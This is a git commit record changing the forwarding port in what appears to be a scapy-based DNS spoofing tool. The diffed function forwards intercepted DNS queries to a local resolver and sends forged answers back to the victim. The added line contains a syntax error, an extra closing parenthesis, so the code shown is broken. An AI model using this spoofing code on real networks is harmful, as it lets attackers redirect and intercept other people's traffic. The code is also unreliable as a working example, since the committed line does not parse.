21f880df0babcf880ccde1098bf776ac060143ed
Wiibleyde <nathan@bonnell.fr>
2022-11-13 11:56:22 +0100

    change of port

--- main.py
+++ main.py
@@ -40,7 +40,7 @@ def dnsSpoofing(targetIP, spoofIP,sourceIP):
 def forwardDnsSpoofing():
     def forwardDNS(orgPacket: IP):
         packet = scapy.IP(dst='127.0.0.1') 
-        packet= packet / scapy.UDP(sport=orgPacket[UDP].sport) 
+        packet= packet / scapy.UDP(sport=orgPacket[UDP].sport, dport=5353)) 
         packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
         answer = scapy.sr1(packet, verbose=0)
         responsePacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=53) / DNS()
